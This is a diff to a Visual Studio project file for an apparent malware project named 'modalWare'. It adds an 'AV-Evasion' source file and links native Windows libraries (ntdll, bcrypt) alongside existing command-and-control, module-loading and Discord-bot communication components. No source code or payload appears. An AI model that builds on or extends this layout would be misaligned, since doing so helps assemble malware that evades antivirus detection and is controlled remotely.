@@ -73,6 +73,9 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <LibraryPath>$(ProjectDir)\Communication\discord_bot\target\staticlib\release;$(LibraryPath)</LibraryPath>
   </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LibraryPath>$(ProjectDir)\Communication\discord_bot\target\staticlib\release;$(LibraryPath)</LibraryPath>
+  </PropertyGroup>
   <PropertyGroup Label="Vcpkg" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <VcpkgUseStatic>true</VcpkgUseStatic>
   </PropertyGroup>
@@ -162,12 +165,16 @@ echo Building discord_bot.dll
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <AdditionalLibraryDirectories>%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
-      <AdditionalDependencies>libcurl.lib;libssl.lib;Ws2_32.lib;libcrypto.lib;Crypt32.lib;Advapi32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>libcurl.lib;libssl.lib;Ws2_32.lib;libcrypto.lib;Crypt32.lib;Advapi32.lib;kernel32.lib;
+ntdll.lib;
+bcrypt.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalOptions>/NODEFAULTLIB:MSVCRT %(AdditionalOptions)</AdditionalOptions>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="modalWare.cpp" />
     <ClCompile Include="ConfigManager\Config.cpp" />
+    <ClCompile Include="src\AV-Evasion.cpp" />
     <ClCompile Include="src\CommandAndControll.cpp" />
     <ClCompile Include="src\FunctionPointer.cpp" />
     <ClCompile Include="src\ModuleLoading.cpp" />
@@ -177,6 +184,7 @@ echo Building discord_bot.dll
   <ItemGroup>
     <ClInclude Include="Communication\discord_bot\discord_bot.h" />
     <ClInclude Include="ConfigManager\Config.h" />
+    <ClInclude Include="src\AV-Evasion.h" />
     <ClInclude Include="src\CommandsAndControll.h" />
     <ClInclude Include="src\FunctionPointer.h" />
     <ClInclude Include="src\ModuleLoading.h" />
